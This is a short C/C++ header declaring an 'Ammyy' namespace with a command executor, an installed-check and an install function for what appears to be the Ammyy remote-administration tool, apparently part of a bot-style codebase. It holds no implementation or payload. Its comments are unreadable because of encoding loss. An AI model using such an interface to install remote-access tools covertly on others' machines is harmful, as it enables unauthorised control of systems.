#ifndef AmmyyH
#define AmmyyH

namespace Ammyy
{

extern const char* NameCmd;

bool Execute(PTaskManager Manager, PCHAR Command, PCHAR Args);
//���������� true, ���� ammyy ����������
bool Installed();
//����������� Ammyy, ���� update = false, �� ���� ��� ����������, �� �������� �� ������
//���� update = true, ���� ��� ���������, �� ������ ������ (��������� ����� ������)
bool Install( bool update = false );

}

#endif //AmmyyH
